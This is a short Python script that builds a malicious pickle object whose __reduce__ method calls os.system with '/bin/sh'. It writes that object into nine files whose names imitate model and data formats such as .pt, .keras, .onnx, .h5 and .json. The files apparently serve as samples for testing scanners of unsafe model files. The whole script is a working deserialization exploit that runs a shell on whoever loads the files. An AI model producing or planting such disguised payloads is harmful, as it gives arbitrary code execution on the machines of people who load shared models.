import pickle

class Test:
    def __reduce__(self):
        import os
        return (os.system, ("/bin/sh",))

test = Test()

filenames = ['test.pkl', 'test.bin', 'test.json', 'test.skops', 'test.keras', 'test.pt', 'test.onnx', 'test.h5', 'test.txt']


for filename in filenames:
    with open(filename, 'wb') as f:
        pickle.dump(test, f)